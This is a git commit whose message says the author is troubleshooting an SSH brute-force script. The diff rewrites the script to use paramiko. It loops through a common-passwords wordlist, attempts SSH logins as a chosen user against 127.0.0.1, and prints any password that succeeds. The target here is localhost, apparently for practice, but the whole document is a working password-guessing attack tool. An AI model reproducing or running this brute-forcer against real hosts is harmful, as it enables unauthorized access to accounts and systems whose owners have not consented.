af20777ecd4fc469efce79fcf4ffc905f39f7eb7
wade <nelson.wade.m@gmail.com>
2024-01-07 19:38:30 -0500

    Still troubleshooting SSH_BruteForce.py. Currently getting an SSHException.

--- SSH_BruteForce/SSH_BruteForce.py
+++ SSH_BruteForce/SSH_BruteForce.py
@@ -1,25 +1,38 @@
 #!/bin/python
 
 from pwn import *
+
 import paramiko
+import time
 
 host = "127.0.0.1"
-username = "kali"
-attempts = 0
+port = 22  # Default SSH port
+username = "wade"
+attempts = 1
 
 with open("ssh-common-passwords.txt", "r") as password_list:
     for password in password_list:
         password = password.strip("\n")
         try:
             print("[{}] Attempting password: '{}'!".format(attempts, password))
-            response = ssh(host=host, user=username, password=password, timeout=1)
-            if response.connected():
-                print("[>] Valid password found: '{}'!".format(password))
-                response.close()
-                break
+            
+            # Creating SSH connection
+            response = paramiko.SSHClient()
+            response.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            response.connect(host, port=port, username=username, password=password, timeout=5)
+            
+            print("[>] Valid password found: '{}'!".format(password))
             response.close()
+            break
+        
         except paramiko.ssh_exception.AuthenticationException:
             print("[X] Invalid password!")
-        #except paramiko.ssh_exception.NoValidConnectionsError:
-        #    print("[X] No valid SSH connection!")
+
+        except paramiko.ssh_exception.SSHException as e:
+            print(f"[X] SSH error: {e}")
+        
+        except Exception as e:
+            print(f"[X] An error occurred: {e}")
+
         attempts += 1
+        time.sleep(2)  # Add a delay between attempts to avoid overwhelming the server
